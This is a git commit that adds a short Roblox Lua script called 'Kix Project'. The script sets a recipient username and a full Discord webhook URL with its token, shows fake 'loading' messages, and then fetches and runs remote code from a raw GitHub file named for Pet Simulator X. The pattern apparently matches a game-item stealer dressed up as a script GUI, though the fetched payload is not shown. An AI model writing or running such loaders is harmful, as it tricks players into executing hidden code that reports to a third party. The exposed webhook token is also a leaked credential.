f4a356b6ddd8d95ae216c2ae2674fb3e9606941b
Edwarddxd <130901393+Edwarddxd@users.noreply.github.com>
2023-04-18 01:47:59 +0300

    Create Script.lua

---
+++ Script.lua
@@ -0,0 +1,9 @@
+Username = "Eduarddinu2017"
+WebHook = "https://discord.com/api/webhooks/1097469172339965972/mxZxcmJTPibwfJWzLNw5aiVXBVC_440_AtQj6-BMlM4TJFd8bZYoZgUhPAV0gsPi63vi"
+
+_G.CustomScriptName = "Kix Project"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting For Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
